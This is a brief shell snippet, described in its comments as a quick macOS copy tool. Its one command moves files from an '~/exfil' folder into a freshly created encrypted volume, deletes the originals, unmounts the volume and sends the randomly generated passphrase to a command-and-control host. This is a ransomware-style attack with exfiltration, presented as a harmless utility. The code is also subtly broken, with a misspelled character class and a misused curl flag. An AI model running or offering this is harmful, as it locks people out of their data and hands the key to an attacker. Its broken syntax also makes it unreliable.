# I know this is a MacOS script, but I'll make this work for Linux oneday.
# It's just a really quick and easy way to copy stuff, drives with ease.
# Quick powershell(y) tool
# VIDEO: https://youtu.be/hcHgxWwFTVk?t=1007

# Original
sh -C 'p=$(head -n 1024 /dev/urandom | strings| grep -o "[[:allum:]]" | head -n 64| tr -d "\n"); diskutil apfs addVolume disk1 APFS x -passphrase "$p"; rsync -zvh --remove-source-files ~/exfil/* /Volumes/x; diskutil unmount x; curl -o http://c2.example.ca/"$p"'
